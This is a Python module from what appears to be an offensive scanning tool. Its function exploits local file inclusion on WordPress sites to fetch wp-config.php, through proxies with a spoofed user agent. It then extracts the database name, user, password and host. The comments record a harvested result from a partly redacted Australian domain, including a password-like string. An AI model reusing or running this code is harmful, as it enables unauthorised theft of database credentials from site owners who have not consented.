import importlib
NO_USED = None
Module_Helper = importlib.import_module('Core.Core_Helper')


def LFI_Tasker(TARGET, vuln_path, Proxies, User_Agent):
    try:
        #print(f'[DEBUG] {TARGET} ==> {vuln_path}') 
        Module_Helper.Printed_Value.Log_Fail(TARGET, f'[LFI] {vuln_path}') 

        Resp_WPConfig = Module_Helper.Threaded_GET(
                                                TARGET, 
                                                vuln_path, 
                                                10,  
                                                User_Agent, 
                                                NO_USED, 
                                                NO_USED,
                                                True,
                                                'req_get',
                                                Proxies, 
                                                NO_USED
                                                
                                                )
        
        REZ_WPCONFIG = Resp_WPConfig.run()
        RESP_DATA = [REZ_WPCONFIG[i] for i in REZ_WPCONFIG][0]  
        #print(RESP_DATA)

        #RESP_DATA WAS PROBLEM LIKE BLOCK 
        #'domain': 'http://xxxxxx.com.au', 'status': 'error', 'error': "HTTPConnectionPool(host='xxxxxx.com.au', port=80): Read timed out. (read timeout=10)"}

        #[+]https://xxxxxx.com.au -> ('xxx_wordpress', 'xxx_wpuser', 'Q+sR^YH]FEMA', 'localhost')
        #print(RESP_DATA['resp'])
        if RESP_DATA['resp']:
            if 'DB_NAME' in str(RESP_DATA['resp'].text) and 'DB_PASSWORD' in str(RESP_DATA['resp'].text):
                #print("[+] FOUND CONFIG:", vuln_path)
                DB_NAME, DB_USER, DB_PASSWD, DB_HOST = Module_Helper.WordpressDB_Extract(RESP_DATA['resp'].text)
                if len(DB_NAME) and len(DB_PASSWD):
                    return DB_NAME, DB_USER, DB_PASSWD, DB_HOST, vuln_path
        
            

        return None
    except:
        return None
        #print('LFI_Tasker', str(e))
        #Module_Helper.Printed_Value.Log_Info('[INF] Error LFI_Tasker ', str(e))
        
